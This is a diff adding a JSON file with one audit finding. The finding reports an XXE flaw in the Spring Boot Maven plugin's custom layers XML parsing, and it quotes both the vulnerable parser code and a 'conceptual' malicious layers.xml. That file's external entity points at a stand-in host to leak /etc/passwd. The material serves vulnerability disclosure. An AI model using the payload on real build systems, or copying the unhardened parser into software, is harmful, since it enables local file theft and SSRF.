@@ -1,0 +1,23 @@
+[
+  {
+    "FindingID": "81a9be80-283e-5d6d-8aab-1988fce3de26",
+    "SessionID": "ChBhZmQ3MzM1ODA2MjhhM2NlEAgaATAqBG1haW4",
+    "Title": "XML External Entity (XXE) Injection in Maven Plugin Custom Layers Parsing",
+    "FilePath": "/home/jfplante_google_com/repos/p20-spring-boot_rep1/spring-boot-project/spring-boot-tools/spring-boot-maven-plugin/src/main/java/org/springframework/boot/maven/AbstractPackagerMojo.java",
+    "Severity": "HIGH",
+    "Confidence": 80,
+    "Analysis": "In `AbstractPackagerMojo.java`, the `getDocumentIfAvailable` method reads an XML configuration file (`layers.xml` or custom layers file) and parses it using a default `DocumentBuilderFactory` instance without disabling external DTDs or external parameter entities. This makes the build plugin vulnerable to XML External Entity (XXE) injection attacks (CWE-611). An attacker who can control or influence the custom layers XML file (e.g., via a malicious pull request or a compromised source repository) can exploit this to read local files, trigger SSRF requests during build time, or exhaust resources.\n\nConceptual Payload (e.g., a malicious `layers.xml` custom configuration file):\n```xml\n\u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e\n\u003c!DOCTYPE custom-layers [\n  \u003c!ENTITY xxe SYSTEM \"http://malicious-host.example.com/leak?data=file:///etc/passwd\"\u003e\n]\u003e\n\u003clayers\u003e\n  \u003clayer name=\"dependencies\"\u003e\n    \u003cinclude\u003e\u0026xxe;\u003c/include\u003e\n  \u003c/layer\u003e\n\u003c/layers\u003e\n```",
+    "Snippet": "\tprivate Document getDocumentIfAvailable(File xmlFile) throws Exception {\n\t\tInputSource inputSource = new InputSource(new FileInputStream(xmlFile));\n\t\tDocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n\t\tfactory.setNamespaceAware(true);\n\t\tDocumentBuilder builder = factory.newDocumentBuilder();\n\t\treturn builder.parse(inputSource);\n\t}",
+    "VulnType": "CWE-611",
+    "VulnID": "CWE-611",
+    "Fingerprint": "",
+    "Status": "OPEN",
+    "SourceStage": "",
+    "FindingJSON": "",
+    "UpdatedAt": "",
+    "StartLine": 202,
+    "EndLine": 208,
+    "DismissReason": "",
+    "ConfidenceLevel": ""
+  }
+]
